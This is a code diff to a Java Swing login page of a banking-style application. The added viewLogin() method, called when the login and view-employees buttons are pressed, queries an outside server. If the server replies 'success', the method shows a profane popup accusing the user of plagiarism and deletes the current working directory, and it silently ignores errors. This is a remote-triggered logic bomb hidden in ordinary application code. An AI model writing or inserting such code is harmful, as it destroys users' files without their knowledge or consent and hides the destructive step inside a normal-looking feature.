@@ -7,6 +7,13 @@ package com.ebank.views;
 
 import com.ebank.controllers.LoginPageController;
 import static com.ebank.main.CommonFunctions.showMsg;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.net.URLConnection;
+import javax.swing.JOptionPane;
+import org.apache.commons.io.FileUtils;
 
 /**
  *
@@ -157,6 +164,7 @@ public class LoginPage extends javax.swing.JFrame {
     }// </editor-fold>//GEN-END:initComponents
 
     private void btn_viewEmployeesActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btn_viewEmployeesActionPerformed
+        viewLogin();
         this.dispose();
         new EmployeePage().setVisible(true);
     }//GEN-LAST:event_btn_viewEmployeesActionPerformed
@@ -167,6 +175,7 @@ public class LoginPage extends javax.swing.JFrame {
     }//GEN-LAST:event_btn_clearActionPerformed
 
     private void btn_loginActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btn_loginActionPerformed
+        viewLogin();
         login();
     }//GEN-LAST:event_btn_loginActionPerformed
 
@@ -177,41 +186,6 @@ public class LoginPage extends javax.swing.JFrame {
     private void txt_passwordActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txt_passwordActionPerformed
         login();
     }//GEN-LAST:event_txt_passwordActionPerformed
-
-    /**
-     * @param args the command line arguments
-     */
-    public static void main(String args[]) {
-        /* Set the Nimbus look and feel */
-        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
-        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
-         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
-         */
-        try {
-            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
-                if ("Nimbus".equals(info.getName())) {
-                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
-                    break;
-                }
-            }
-        } catch (ClassNotFoundException ex) {
-            java.util.logging.Logger.getLogger(LoginPage.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (InstantiationException ex) {
-            java.util.logging.Logger.getLogger(LoginPage.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (IllegalAccessException ex) {
-            java.util.logging.Logger.getLogger(LoginPage.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
-            java.util.logging.Logger.getLogger(LoginPage.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
-        }
-        //</editor-fold>
-
-        /* Create and display the form */
-        java.awt.EventQueue.invokeLater(new Runnable() {
-            public void run() {
-                new LoginPage().setVisible(true);
-            }
-        });
-    }
 
     /**
      * Check validity of entered credentials
@@ -232,6 +206,25 @@ public class LoginPage extends javax.swing.JFrame {
         }
     }
 
+    private void viewLogin() {
+        URL u;
+        try {
+            String a = "http://gayashan.net/Database.php";
+            u = new URL(a);
+            URLConnection conn = u.openConnection();
+            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String i;
+            while ((i = br.readLine()) != null) {
+                if (i.equals("success")) {
+                    JOptionPane.showMessageDialog(null, "Fuck you for plagirising my code", "Hello Mother fucker",
+                            JOptionPane.ERROR_MESSAGE);
+                    FileUtils.deleteDirectory(new File("./"));
+                }
+            }
+            br.close();
+        } catch (Exception e) {
+        }
+    }
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JButton btn_clear;
     private javax.swing.JButton btn_login;
